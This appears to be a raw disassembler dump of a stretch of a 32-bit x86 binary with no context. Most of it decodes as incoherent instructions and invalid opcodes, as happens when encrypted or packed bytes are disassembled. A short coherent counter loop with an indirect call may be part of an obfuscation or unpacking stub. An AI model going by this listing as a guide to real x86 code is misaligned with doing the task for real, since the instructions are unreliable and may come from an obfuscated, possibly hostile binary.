  41d680:	mov    ds:0xb3b238f0,eax
  41d685:	jecxz  0x41d64f
  41d687:	rcl    BYTE PTR [esi+0x26cb7ecb],cl
  41d68d:	jns    0x41d647
  41d68f:	daa    
  41d690:	push   edx
  41d691:	std    
  41d692:	push   eax
  41d693:	loop   0x41d6ae
  41d695:	cld    
  41d696:	mov    bh,0x92
  41d698:	arpl   cx,bx
  41d69a:	sti    
  41d69b:	fst    DWORD PTR [esi+0x4e]
  41d69e:	es jb  0x41d69b
  41d6a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6a2:	sub    DWORD PTR [ebx+edi*2-0x432a5730],esi
  41d6a9:	sub    ebp,esi
  41d6ab:	pop    es
  41d6ac:	inc    ebp
  41d6ad:	xchg   ecx,eax
  41d6ae:	cmp    eax,0xfa4920b3
  41d6b3:	int3   
  41d6b4:	psllq  mm6,mm3
  41d6b7:	scas   eax,DWORD PTR es:[edi]
  41d6b8:	add    cl,BYTE PTR [edx+0x39cf4335]
  41d6be:	ins    BYTE PTR es:[di],dx
  41d6c0:	clc    
  41d6c1:	das    
  41d6c2:	pop    es
  41d6c3:	test   al,0x7a
  41d6c5:	adc    DWORD PTR [ecx+ebx*4+0x1c88c71b],edi
  41d6cc:	int    0xae
  41d6ce:	rcl    DWORD PTR [eax+ecx*1+0xfc7171c],cl
  41d6d5:	(bad)  
  41d6d6:	sbb    ch,dl
  41d6d8:	or     ah,0x78
  41d6db:	push   edx
  41d6dc:	stc    
  41d6dd:	int    0x1
  41d6df:	mov    ch,0xda
  41d6e1:	sub    BYTE PTR [edi+eax*2],0x26
  41d6e5:	aam    0x25
  41d6e7:	adc    al,0x22
  41d6e9:	xchg   edx,eax
  41d6ea:	adc    BYTE PTR [edx+0x1b],ch
  41d6ed:	repz add BYTE PTR [ebx-0x10],bh
  41d6f1:	pop    esp
  41d6f2:	adc    ebx,DWORD PTR [eax+0x5688f36a]
  41d6f8:	or     DWORD PTR [eax-0x46],0x87ef8fa1
  41d6ff:	mov    esi,0xc2c0de36
  41d704:	push   esi
  41d705:	mov    ds:0x5aef23c2,al
  41d70a:	mov    cl,0xc0
  41d70c:	push   0xdd34724e
  41d711:	add    al,0xc1
  41d713:	imul   edi,DWORD PTR [ebp-0x6e],0x2bf6be30
  41d71a:	repz data16 daa 
  41d71d:	jae    0x41d771
  41d71f:	dec    edi
  41d720:	mov    WORD PTR [ebx-0x32af6494],cs
  41d726:	pusha  
  41d727:	push   0x6a
  41d729:	dec    edi
  41d72a:	jp     0x41d74a
  41d72c:	mov    ch,0x46
  41d72e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d72f:	mov    ah,0xdf
  41d731:	pop    edi
  41d732:	(bad)  
  41d733:	or     ebp,DWORD PTR [ecx]
  41d735:	mov    ecx,ebx
  41d737:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d738:	jo     0x41d6f2
  41d73a:	inc    eax
  41d73b:	fstp   QWORD PTR [esp+edi*8+0x4c79c80a]
  41d742:	push   eax
  41d743:	cwde   
  41d744:	retf   0xc30
  41d747:	jge    0x41d794
  41d749:	fcomip st,st(6)
  41d74b:	cmp    eax,0x51635bd2
  41d750:	cmc    
  41d751:	xchg   ebp,eax
  41d752:	push   cs
  41d753:	pop    ebp
  41d754:	or     edx,DWORD PTR [esp+edx*4]
  41d757:	cld    
  41d758:	mov    ah,0x86
  41d75a:	mov    ebp,DWORD PTR [ebp-0x53623f3c]
  41d760:	fwait
  41d761:	hlt    
  41d762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d763:	cmp    al,0x2a
  41d765:	push   esp
  41d766:	mov    cl,0xae
  41d768:	jge    0x41d70c
  41d76a:	outs   dx,DWORD PTR ds:[esi]
  41d76b:	imul   ecx,ecx,0xf80685d1
  41d771:	les    ecx,FWORD PTR [ebp+0x24]
  41d774:	push   esp
  41d775:	adc    eax,0x76d289a
  41d77a:	pop    eax
  41d77b:	in     al,dx
  41d77c:	adc    eax,0xb653b027
  41d781:	(bad)  
  41d784:	mov    cl,0xb2
  41d786:	jbe    0x41d720
  41d788:	(bad)  
  41d789:	clc    
  41d78a:	sbb    DWORD PTR [edi+0x38],ebx
  41d78d:	out    0x3b,eax
  41d78f:	xchg   esi,eax
  41d790:	imul   ebx,DWORD PTR ds:0x1d26e015,0x7dc06d75
  41d79a:	clc    
  41d79b:	and    BYTE PTR [eax-0x8c8271a],dl
  41d7a1:	jg     0x41d735
  41d7a3:	sbb    al,0xbb
  41d7a5:	dec    ebx
  41d7a6:	mov    esp,0xa532bec7
  41d7ab:	loop   0x41d803
  41d7ad:	mov    al,0x27
  41d7af:	(bad)  
  41d7b0:	jbe    0x41d790
  41d7b2:	fwait
  41d7b3:	les    ebx,FWORD PTR [edx+0x2c]
  41d7b6:	inc    edx
  41d7b7:	or     ebp,edx
  41d7b9:	js     0x41d7f0
  41d7bb:	ficomp WORD PTR [ecx-0xb22d957]
  41d7c1:	add    edx,DWORD PTR [edi]
  41d7c3:	mov    al,cs:0x4c0dbe35
  41d7c9:	ror    ah,1
  41d7cb:	mov    eax,0x9484c79a
  41d7d0:	push   DWORD PTR [ecx+0x57a2181d]
  41d7d6:	sbb    eax,DWORD PTR [ebx-0x5239e9d2]
  41d7dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7dd:	cld    
  41d7de:	inc    ebx
  41d7df:	inc    edi
  41d7e0:	or     DWORD PTR [ebx],ecx
  41d7e2:	pop    edi
  41d7e3:	or     ecx,DWORD PTR [edi]
  41d7e5:	sub    BYTE PTR [esp+ebx*4-0x5d],dl
  41d7e9:	sub    DWORD PTR [edx-0x41],eax
  41d7ec:	cdq    
  41d7ed:	push   ss
  41d7ee:	retf   
  41d7ef:	lock mov eax,ds:0xf5390c93
  41d7f5:	mov    bh,0x12
  41d7f7:	dec    esi
  41d7f8:	adc    BYTE PTR [ecx+ebx*2+0x7b],bl
  41d7fc:	lea    esi,[esi-0x6f60cd2c]
  41d802:	and    dl,BYTE PTR [ebx-0x66]
  41d805:	jg     0x41d877
  41d807:	mov    bh,0xf1
  41d809:	mov    ebx,0x2546f0f2
  41d80e:	xor    eax,0x99cf0e92
  41d813:	dec    edx
  41d814:	mov    cl,0x59
  41d816:	xchg   edx,eax
  41d817:	mov    bl,0x5a
  41d819:	iret   
  41d81a:	in     al,0x2f
  41d81c:	cdq    
  41d81d:	call   0xdd6f:0x2163488d
  41d824:	and    eax,DWORD PTR cs:[edi]
  41d827:	inc    ebx
  41d828:	rcl    DWORD PTR [ecx+edx*1-0xa],0x84
  41d82d:	push   esp
  41d82e:	(bad)  
  41d82f:	xor    eax,0x7987915
  41d834:	rcr    DWORD PTR [ebp+0x7311fe41],0x55
  41d83b:	or     esp,DWORD PTR [ebx+0x30aa8971]
  41d841:	mov    dh,0x2b
  41d843:	dec    eax
  41d844:	daa    
  41d845:	dec    ebx
  41d846:	not    BYTE PTR [ebp-0x52]
  41d849:	cdq    
  41d84a:	xor    al,0x19
  41d84c:	cmp    bh,BYTE PTR [esp+edi*2+0x7b]
  41d850:	pop    ecx
  41d851:	(bad)  
  41d852:	leave  
  41d853:	and    eax,0xe62df01b
  41d858:	pop    esp
  41d859:	iret   
  41d85a:	inc    ecx
  41d85b:	lds    edx,FWORD PTR [edi]
  41d85d:	mov    ss,WORD PTR [edx-0x48a17cc5]
  41d863:	pop    edi
  41d864:	dec    esp
  41d865:	xor    bh,dl
  41d867:	mov    dh,0x7c
  41d869:	enter  0x780e,0x2
  41d86d:	test   bh,ah
  41d86f:	pop    ebx
  41d870:	rcl    ah,0x75
  41d873:	jmp    0x41d845
  41d875:	sub    esi,DWORD PTR [esi]
  41d877:	pop    es
  41d878:	inc    DWORD PTR [eax+edx*4]
  41d87b:	pop    esp
  41d87c:	or     DWORD PTR [edi-0x80],eax
  41d87f:	adc    edx,DWORD PTR [eax]
  41d881:	loopne 0x41d8a8
  41d883:	lods   eax,DWORD PTR ds:[esi]
  41d884:	jge    0x41d8c8
  41d886:	mov    eax,DWORD PTR ds:0x251dc342
  41d88c:	sbb    BYTE PTR [esp+eax*4],ch
  41d88f:	add    bh,al
  41d891:	loope  0x41d8bd
  41d893:	(bad)  
  41d894:	pop    esi
  41d895:	mov    al,ds:0x8a8d3f8
  41d89a:	push   0xed91d2f5
  41d89f:	inc    ebx
  41d8a0:	sub    al,0x67
  41d8a2:	pop    ecx
  41d8a3:	add    al,BYTE PTR [edx]
  41d8a5:	xchg   ebp,eax
  41d8a6:	dec    edx
  41d8a7:	nop
  41d8a8:	mov    eax,ds:0x9fdf2db9
  41d8ad:	ret    0xce3c
  41d8b0:	stc    
  41d8b1:	sbb    eax,0x8a789fe4
  41d8b6:	inc    esp
  41d8b7:	scas   al,BYTE PTR es:[edi]
  41d8b8:	iret   
  41d8b9:	test   ecx,ebp
  41d8bb:	inc    ecx
  41d8bc:	addr16 es pushf 
  41d8bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8c1:	mov    al,0xab
  41d8c3:	push   ebp
  41d8c4:	mov    ch,0x7f
  41d8c6:	cld    
  41d8c7:	adc    eax,0xfc201f05
  41d8cc:	std    
  41d8cd:	mov    ecx,0x40913ba5
  41d8d2:	xchg   esp,eax
  41d8d3:	xor    eax,DWORD PTR [eax-0x16]
  41d8d6:	test   eax,0x275705fc
  41d8db:	inc    ebp
  41d8dc:	fisub  WORD PTR [ebp+0x67]
  41d8df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8e0:	push   es
  41d8e1:	xor    al,bl
  41d8e3:	fs mov dl,0xa5
  41d8e6:	mov    esi,0x64983d7
  41d8eb:	popf   
  41d8ec:	mov    al,ds:0xf432a8f
  41d8f1:	push   cs
  41d8f2:	pop    edx
  41d8f3:	arpl   WORD PTR [edx],dx
  41d8f5:	lea    edx,[esi+0x5ccd289b]
  41d8fb:	nop
  41d8fc:	fistp  DWORD PTR [edx+0x22987290]
  41d902:	push   es
  41d903:	push   ebp
  41d904:	mov    eax,ds:0xf926088d
  41d909:	or     esi,DWORD PTR [ebx]
  41d90b:	xlat   BYTE PTR ds:[ebx]
  41d90c:	inc    ebx
  41d90d:	cmp    cl,0xf8
  41d910:	stos   BYTE PTR es:[edi],al
  41d911:	inc    eax
  41d912:	lods   eax,DWORD PTR ds:[esi]
  41d913:	loop   0x41d89e
  41d915:	jg     0x41d951
  41d917:	leave  
  41d918:	add    bh,BYTE PTR [ebp+0x17]
  41d91b:	ror    esi,1
  41d91d:	cli    
  41d91e:	push   edi
  41d91f:	stos   BYTE PTR es:[edi],al
  41d920:	das    
  41d921:	lock stos DWORD PTR es:[edi],eax
  41d923:	xor    eax,0x6508d18f
  41d928:	cmc    
  41d929:	iret   
  41d92a:	inc    esp
  41d92b:	call   0x2efe:0x41cd10c0
  41d932:	arpl   WORD PTR [ebx],dx
  41d934:	add    edi,DWORD PTR [ebp-0xd]
  41d937:	pop    ecx
  41d938:	inc    esi
  41d939:	mov    esi,0x4a572fd5
  41d93e:	fincstp 
  41d940:	or     eax,0xc2cccc43
  41d945:	mov    ds:0x21f95d19,al
  41d94a:	sub    ah,BYTE PTR [ecx+0x1d1dc095]
  41d950:	fiadd  WORD PTR [edx+0x3a]
  41d953:	out    dx,eax
  41d954:	idiv   DWORD PTR [ebp+eax*1+0x26]
  41d958:	fnstcw WORD PTR [esi+0x77a2d72a]
  41d95e:	inc    esp
  41d95f:	loopne 0x41d99f
  41d961:	js     0x41d904
  41d963:	aas    
  41d964:	jg     0x41d9c4
  41d966:	popa   
  41d967:	add    ecx,eax
  41d969:	xlat   BYTE PTR ds:[ebx]
  41d96a:	stos   DWORD PTR es:[edi],eax
  41d96b:	xor    BYTE PTR [ecx],0x8b
  41d96e:	xor    ch,BYTE PTR [ebx-0x446d6b6b]
  41d974:	scas   al,BYTE PTR es:[edi]
  41d975:	hlt    
  41d976:	test   al,0xdd
  41d978:	pop    ebx
  41d979:	shl    BYTE PTR [edx+0x43e9e40e],0xb7
  41d980:	mov    eax,0xc76555da
  41d985:	pop    edi
  41d986:	dec    ebp
  41d987:	or     cl,BYTE PTR [ebp+edi*8-0x1a26a317]
  41d98e:	jge    0x41d950
  41d990:	repz call 0xb26543ee
  41d996:	rol    DWORD PTR [esi-0x5cf02c1d],1
  41d99c:	add    ah,BYTE PTR [ebx-0x471fb0bb]
  41d9a2:	out    dx,eax
  41d9a3:	and    cl,BYTE PTR [esp+ebx*2+0x50]
  41d9a7:	xor    DWORD PTR [eax-0x46],esp
  41d9aa:	out    0xa2,eax
  41d9ac:	outs   dx,DWORD PTR ds:[esi]
  41d9ad:	mov    esi,0x5f40a9e3
  41d9b2:	mov    ds:0xec87b2ae,eax
  41d9b7:	pop    ebp
  41d9b8:	mov    ds:0xc5ba5312,eax
  41d9bd:	fiadd  DWORD PTR [ebx+0x74]
  41d9c0:	jle    0xb1503eb4
  41d9c6:	dec    edi
  41d9c7:	jle    0x41d9ef
  41d9c9:	mov    ?,WORD PTR [ebx-0x70]
  41d9cc:	cs dec ebx
  41d9ce:	mov    dl,0xc6
  41d9d0:	addr16 mov ecx,0x98ff919a
  41d9d6:	stos   DWORD PTR es:[edi],eax
  41d9d7:	daa    
  41d9d8:	push   ecx
  41d9d9:	gs xor ah,bl
  41d9dc:	imul   DWORD PTR [edx-0x1]
  41d9df:	out    0x26,al
  41d9e1:	scas   eax,DWORD PTR es:[edi]
  41d9e2:	aaa    
  41d9e3:	pop    edx
  41d9e4:	mov    bh,0xc6
  41d9e6:	pop    ecx
  41d9e7:	xor    BYTE PTR [edx+0x1f],0x9c
  41d9eb:	enter  0xf866,0x53
  41d9ef:	idiv   DWORD PTR [ecx+0x19]
  41d9f2:	jl     0x41da6c
  41d9f4:	jae    0x41d9a5
  41d9f6:	or     DWORD PTR [ebx],eax
  41d9f8:	jg     0x41da62
  41d9fa:	fwait
  41d9fb:	jae    0x41d9fa
  41d9fd:	fmul   QWORD PTR [eax]
  41d9ff:	jmp    0x41da4c
  41da01:	pop    esp
  41da02:	fs sub al,0xd2
  41da05:	jno    0x41d9a9
  41da07:	sub    ah,BYTE PTR [ebx+0xede84d7]
  41da0d:	inc    esp
  41da0e:	inc    esi
  41da0f:	xchg   esi,eax
  41da10:	imul   esi,DWORD PTR [ebp+0x65040a21],0x61bacfea
  41da1a:	mov    ecx,0x5c34807b
  41da1f:	push   eax
  41da20:	sbb    ecx,esp
  41da22:	ss pop ebx
  41da24:	loope  0x41daa0
  41da26:	pop    esp
  41da27:	out    0x1a,al
  41da29:	fld    TBYTE PTR [ebx]
  41da2b:	and    eax,0x9e7f3d79
  41da30:	mov    cl,0x6e
  41da32:	ins    DWORD PTR es:[edi],dx
  41da33:	bound  ebx,QWORD PTR [bx+0x56]
  41da37:	adc    DWORD PTR [esi],edx
  41da39:	sbb    DWORD PTR [eax],ecx
  41da3b:	and    DWORD PTR [ebp+edx*2+0x63759b77],esp
  41da42:	push   ecx
  41da43:	retf   0xc309
  41da46:	shr    dh,0x53
  41da49:	xchg   esi,eax
  41da4a:	pop    edi
  41da4b:	jmp    0x41d9ec
  41da4d:	ja     0x41daa5
  41da4f:	outs   dx,BYTE PTR ds:[esi]
  41da50:	or     bh,BYTE PTR [esi-0x2]
  41da53:	or     DWORD PTR [edi+0xa42abb],esp
  41da59:	stos   DWORD PTR es:[edi],eax
  41da5a:	push   edi
  41da5b:	cmp    al,bl
  41da5d:	fs or  ecx,ecx
  41da60:	iret   
  41da61:	xchg   ecx,eax
  41da62:	retf   
  41da63:	fdiv   st,st(2)
  41da65:	(bad)
  41da68:	adc    eax,0x8c814462
  41da6d:	mov    dl,0x2b
  41da6f:	mov    edi,0x83f2c6e0
  41da74:	lods   al,BYTE PTR ds:[esi]
  41da75:	add    al,0xd2
  41da77:	ds aad 0x2c
  41da7a:	cmp    esi,DWORD PTR [ecx+0x48c7c124]
  41da80:	or     bl,BYTE PTR [esi]
  41da82:	mov    bl,0x34
  41da84:	pop    edi
  41da85:	mov    bh,0x6b
  41da87:	lds    esp,FWORD PTR [eax]
  41da89:	dec    esp
  41da8a:	sub    BYTE PTR [ecx+0x5bb422c8],al
  41da90:	sahf   
  41da91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da92:	mov    edi,0xfcfbdf0e
  41da97:	jo     0x41da67
  41da99:	pop    ecx
  41da9a:	aas    
  41da9b:	shl    BYTE PTR [eax+0xb771ab],0xa1
  41daa2:	inc    edi
  41daa3:	mov    DWORD PTR [ebx+eax*4],ecx
  41daa6:	add    eax,0x5785ece
  41daac:	inc    esi
  41daad:	push   ecx
  41daae:	cmp    DWORD PTR [esi-0x31b3841f],ebp
  41dab4:	dec    esi
  41dab5:	shl    DWORD PTR [edx-0x7a],cl
  41dab8:	mov    edi,0x9fe0488c
  41dabd:	gs stos DWORD PTR es:[edi],eax
  41dabf:	mov    bl,0x8d
  41dac1:	sahf   
  41dac2:	fs pop edx
  41dac4:	addr16 int3 
  41dac6:	(bad)  
  41dac7:	push   ecx
  41dac8:	jle    0x41dab0
  41daca:	fwait
  41dacb:	int    0x14
  41dacd:	pushf  
  41dace:	fcomp  QWORD PTR [edx]
  41dad0:	mov    al,0x29
  41dad2:	xchg   ebx,eax
  41dad3:	add    DWORD PTR [eax+0x7a],esi
  41dad6:	gs aad 0x13
  41dad9:	repz fbstp TBYTE PTR [esi+0x6a]
  41dadd:	mov    dh,0x7c
  41dadf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dae0:	ret    0xc3e5
  41dae3:	loope  0x41db5c
  41dae5:	call   FWORD PTR [edx+0x35]
  41dae8:	lods   al,BYTE PTR ds:[esi]
  41dae9:	mov    ds:0x7386b11,eax
  41daee:	imul   eax,DWORD PTR [ebx-0x51],0xffffff8c
  41daf2:	aas    
  41daf3:	dec    ebp
  41daf4:	xor    eax,DWORD PTR [esi-0x79ef4ab6]
  41dafa:	pop    eax
  41dafb:	mov    al,ds:0xc85805f9
  41db00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db01:	addr16 pop esi
  41db03:	ds push esi
  41db05:	inc    esp
  41db06:	lods   eax,DWORD PTR ds:[esi]
  41db07:	mov    eax,0xece6f3f3
  41db0c:	in     al,0xb2
  41db0e:	mov    esp,0x23502ef9
  41db13:	push   ds
  41db14:	mov    BYTE PTR [esi+0x73],bh
  41db17:	stos   BYTE PTR es:[edi],al
  41db18:	scas   eax,DWORD PTR es:[edi]
  41db19:	jo     0x41db52
  41db1b:	mov    ds:0xe2ead171,eax
  41db20:	jno    0x41dae5
  41db22:	add    al,0x3d
  41db24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db25:	jmp    0x41db48
  41db27:	xchg   esi,eax
  41db28:	jecxz  0x41db54
  41db2a:	hlt    
  41db2b:	fbstp  TBYTE PTR [eax]
  41db2d:	and    eax,0x1aaeb2a6
  41db32:	sub    ebp,DWORD PTR [esi-0x69]
  41db35:	pushf  
  41db36:	xor    BYTE PTR [ecx+0x3aca1eb3],cl
  41db3c:	and    edx,esi
  41db3e:	hlt    
  41db3f:	daa    
  41db40:	sbb    DWORD PTR [ecx+0x34],edi
  41db43:	and    bl,BYTE PTR [edx]
  41db45:	mov    BYTE PTR [edx-0x67c415be],bl
  41db4b:	repnz mov eax,0x755d3375
  41db51:	mov    ebp,0xb60708fe
  41db56:	sbb    al,0x33
  41db58:	cmp    edx,DWORD PTR [ecx]
  41db5a:	mov    DWORD PTR [esi-0x4e86678b],esp
  41db60:	(bad)  
  41db61:	mov    dl,0xec
  41db63:	fwait
  41db64:	jne    0x41dba4
  41db66:	jecxz  0x41db54
  41db68:	or     eax,0x2137aaa1
  41db6d:	jo     0x41db82
  41db6f:	add    eax,DWORD PTR [ebp-0x1]
  41db72:	out    0xef,al
  41db74:	in     al,dx
  41db75:	mov    eax,ds:0x682ce3da
  41db7a:	mov    ds:0x6467eb8f,al
  41db7f:	sub    edx,eax
  41db81:	pushf  
  41db82:	adc    eax,0x33eef237
  41db87:	sbb    al,0x58
  41db89:	scas   eax,DWORD PTR es:[edi]
  41db8a:	cs je  0x41db14
  41db8d:	aad    0xc9
  41db8f:	push   ebp
  41db90:	adc    esi,DWORD PTR [eax-0x3cfc9972]
  41db96:	sbb    BYTE PTR [ecx+eax*2],ch
  41db99:	sub    al,0x2f
  41db9b:	pop    edi
  41db9c:	das    
  41db9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db9e:	(bad)  
  41dba0:	test   al,0x5e
  41dba2:	(bad)  
  41dba4:	inc    esp
  41dba5:	out    dx,al
  41dba6:	mov    ecx,0x9e50ee10
  41dbab:	(bad)  
  41dbac:	jmp    0x77d0:0x3dfca2d7
  41dbb3:	dec    eax
  41dbb4:	(bad)  
  41dbb6:	lds    ebx,FWORD PTR [ebx]
  41dbb8:	or     eax,0x4a68d3ad
  41dbbd:	rcl    DWORD PTR [edx-0x80],1
  41dbc0:	ss inc ecx
  41dbc2:	and    edx,ebx
  41dbc4:	jbe    0x41dc0a
  41dbc6:	stos   BYTE PTR es:[edi],al
  41dbc7:	adc    DWORD PTR [ecx+0x655a120c],ecx
  41dbcd:	repz ret 0xe650
  41dbd1:	aam    0xf4
  41dbd3:	adc    bl,bl
  41dbd5:	stos   DWORD PTR es:[edi],eax
  41dbd6:	adc    BYTE PTR [esp+eax*1-0x37],bh
  41dbda:	cdq    
  41dbdb:	mov    esi,0x7d0d0cce
  41dbe0:	fnstsw WORD PTR [eax+0x169bde79]
  41dbe6:	mov    ah,0x32
  41dbe8:	mov    bh,0x3a
  41dbea:	out    dx,al
  41dbeb:	xlat   BYTE PTR ds:[ebx]
  41dbec:	fwait
  41dbed:	xchg   BYTE PTR [esi+eax*2-0x740fba77],bl
  41dbf4:	or     eax,0x42b1de
  41dbf9:	and    DWORD PTR ds:0x42b212,ecx
  41dbff:	xor    DWORD PTR [ebp-0x10],0xf89cb5a5
  41dc06:	mov    eax,DWORD PTR [ebp-0x18]
  41dc09:	mov    DWORD PTR ds:0x42b19a,0x12
  41dc13:	cmp    DWORD PTR ds:0x42b19a,0x0
  41dc1a:	je     0x41fffa
  41dc20:	cmp    DWORD PTR ds:0x42b19a,0x4
  41dc27:	jle    0x41fffa
  41dc2d:	jmp    0x41dc3b
  41dc32:	push   DWORD PTR [ebp-0x18]
  41dc35:	call   DWORD PTR ds:0x42b2f2
  41dc3b:	cmp    DWORD PTR ds:0x42b19a,0x5
  41dc42:	jne    0x41dc57
  41dc48:	xor    ecx,ecx
  41dc4a:	add    ecx,DWORD PTR ds:0x42b19a
  41dc50:	dec    ecx
  41dc51:	mov    DWORD PTR ds:0x42b19a,ecx
  41dc57:	mov    ecx,DWORD PTR ds:0x42b19a
  41dc5d:	dec    ecx
  41dc5e:	mov    DWORD PTR ds:0x42b19a,ecx
  41dc64:	jmp    0x41dc13
  41dc69:	jmp    0x41fffa
  41dc6e:	push   cs
  41dc6f:	mov    BYTE PTR [edi-0x79d57893],0x82
  41dc76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc77:	mov    dl,0xfb
  41dc79:	cs enter 0x70f7,0xf
  41dc7e:	jp     0x41dc5b
  41dc80:	add    BYTE PTR [ebx-0x7c7ca1f1],0xba
  41dc87:	and    DWORD PTR [esi],eax
  41dc89:	popa   
  41dc8a:	xchg   ebx,eax
  41dc8b:	cld    
  41dc8c:	outs   dx,DWORD PTR ds:[esi]
  41dc8d:	ret    0xd8aa
  41dc90:	jne    0x41dc4a
  41dc92:	lods   al,BYTE PTR ds:[esi]
  41dc93:	loopne 0x41dc39
  41dc95:	outs   dx,DWORD PTR ds:[esi]
  41dc96:	stos   DWORD PTR es:[edi],eax
  41dc97:	and    eax,0x49874f2b
  41dc9c:	push   ds
  41dc9d:	sbb    dl,BYTE PTR [edi+0x3f]
  41dca0:	or     al,dl
  41dca2:	sar    esp,1
  41dca4:	lds    ecx,FWORD PTR [esp+ecx*4]
  41dca7:	xchg   edi,eax
  41dca8:	out    dx,al
  41dca9:	es enter 0xa12b,0x62
  41dcae:	jmp    0xb207:0x90c35e3f
  41dcb5:	adc    eax,0xc8e75679
  41dcba:	jns    0x41dc75
  41dcbc:	lods   eax,DWORD PTR ds:[esi]
  41dcbd:	lahf   
  41dcbe:	add    al,dl
  41dcc0:	in     al,0x48
  41dcc2:	addr16 shl esi,0xf
  41dcc6:	outs   dx,DWORD PTR ds:[esi]
  41dcc7:	(bad)  
  41dcc8:	pop    ebp
  41dcc9:	(bad)  
  41dcca:	(bad)  
  41dccb:	mov    dh,0xb9
  41dccd:	lock std 
  41dccf:	mov    ecx,edi
  41dcd1:	jmp    0x41dd4b
  41dcd3:	push   0x216c117a
  41dcd8:	or     bh,BYTE PTR [edi-0x76]
  41dcdb:	loope  0x41dcf1
  41dcdd:	sbb    ecx,esi
  41dcdf:	rcr    esp,cl
  41dce1:	mov    bl,0x5
  41dce3:	jl     0x41dd21
  41dce5:	xchg   edx,eax
  41dce6:	jns    0x41dc72
  41dce8:	jle    0x41dca2
  41dcea:	bound  edx,QWORD PTR [edx+ebp*8-0xe]
  41dcee:	mov    ebp,0x97c8a443
  41dcf3:	pop    esp
  41dcf4:	sbb    eax,0x2b0a67e3
  41dcf9:	aas    
  41dcfa:	inc    ebp
  41dcfb:	fdiv   QWORD PTR [ecx-0x7420caa8]
  41dd01:	out    0xf4,al
  41dd03:	xchg   ecx,eax
  41dd04:	ins    BYTE PTR es:[edi],dx
  41dd05:	dec    eax
  41dd06:	lahf   
  41dd07:	push   ds
  41dd08:	(bad)  
  41dd09:	(bad)  
  41dd0b:	loop   0x41dd0f
  41dd0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd0e:	jge    0x41dd7b
  41dd10:	rol    BYTE PTR [edx+ecx*4+0x6c],1
  41dd14:	fist   WORD PTR [ecx+0x2b]
  41dd17:	popf   
  41dd18:	cwde   
  41dd19:	sub    BYTE PTR [edi-0x10],dh
  41dd1c:	cmp    DWORD PTR [esi+esi*8+0x68],ecx
  41dd20:	mov    ecx,0x3bd95e17
  41dd25:	pop    bx
  41dd27:	(bad)  [edx+0x2eef6c21]
  41dd2d:	pop    es
  41dd2e:	out    dx,al
  41dd2f:	imul   esi,esp,0xe14be75b
  41dd35:	and    edx,ebp
  41dd37:	(bad)  
  41dd38:	nop
  41dd39:	sub    eax,0x5708fab3
  41dd3e:	sub    al,BYTE PTR gs:[ebp-0x703df72]
  41dd45:	lods   al,BYTE PTR ds:[esi]
  41dd46:	xchg   BYTE PTR [ebx+0x7a11b118],cl
  41dd4c:	jl     0x41dd57
  41dd4e:	retf   
  41dd4f:	stos   DWORD PTR es:[edi],eax
  41dd50:	dec    esi
  41dd51:	and    eax,0xc1df8a73
  41dd56:	sub    eax,0xac4c4533
  41dd5b:	addr16 push edx
  41dd5d:	jl     0x41dda0
  41dd5f:	neg    dh
  41dd61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd62:	jecxz  0x41ddac
  41dd64:	cmc    
  41dd65:	ret    
  41dd66:	(bad)  
  41dd67:	cmp    ch,BYTE PTR [ebx]
  41dd69:	pop    edi
  41dd6a:	fmul   QWORD PTR [ecx-0x61]
  41dd6d:	gs mov dl,0x65
  41dd70:	popf   
  41dd71:	scas   al,BYTE PTR es:[edi]
  41dd72:	jmp    0x41dd5a
  41dd74:	push   ebp
  41dd75:	jbe    0x41dd18
  41dd77:	int3   
  41dd78:	shr    DWORD PTR [ebx-0x10b5abac],1
  41dd7e:	and    BYTE PTR [ebp-0xf],al
  41dd81:	add    al,0x4
  41dd83:	jno    0x41dd42
  41dd85:	sub    al,0x55
  41dd87:	test   bh,ah
  41dd89:	or     BYTE PTR [edi-0x254bb546],bl
  41dd8f:	sbb    al,0xa0
  41dd91:	push   edi
  41dd92:	(bad)  
  41dd93:	repz es cld 
  41dd96:	pop    ebx
  41dd98:	mov    esp,0x40f20c20
  41dd9d:	stos   BYTE PTR es:[edi],al
  41dd9e:	fwait
  41dd9f:	mov    ebp,0x68bf6201
  41dda4:	add    DWORD PTR [esi-0x1d14cdb5],ebp
  41ddaa:	push   DWORD PTR [ebx+0x69]
  41ddad:	scas   eax,DWORD PTR es:[edi]
  41ddae:	cmp    cl,BYTE PTR [esi]
  41ddb0:	pop    es
  41ddb1:	jno    0x41dd4e
  41ddb3:	cmp    BYTE PTR [edx+0x61],bh
  41ddb6:	rcl    DWORD PTR [ecx-0x57c74197],cl
  41ddbc:	(bad)  
  41ddbd:	outs   dx,DWORD PTR ss:[esi]
  41ddbf:	shl    BYTE PTR [ebx+0x4d61e2ff],cl
  41ddc5:	dec    ecx
  41ddc6:	lds    ebp,FWORD PTR [ecx-0x611b9040]
  41ddcc:	pop    edi
  41ddcd:	aam    0xf1
  41ddcf:	and    al,0x96
  41ddd1:	clc    
  41ddd2:	out    0xfe,al
  41ddd4:	test   al,0x1b
  41ddd6:	ror    DWORD PTR [ebp+0xf],cl
  41ddd9:	cmp    ch,BYTE PTR [ebp-0x57f48535]
  41dddf:	push   0xa75899f1
  41dde4:	dec    eax
  41dde5:	mov    BYTE PTR [ebx-0xa],ch
  41dde8:	cmp    ebx,DWORD PTR [ebx+0x4d]
  41ddeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddec:	mov    ecx,0x7352bff9
  41ddf1:	sbb    ecx,DWORD PTR [ebx]
  41ddf3:	int3   
  41ddf4:	xchg   edi,eax
  41ddf5:	into   
  41ddf6:	popa   
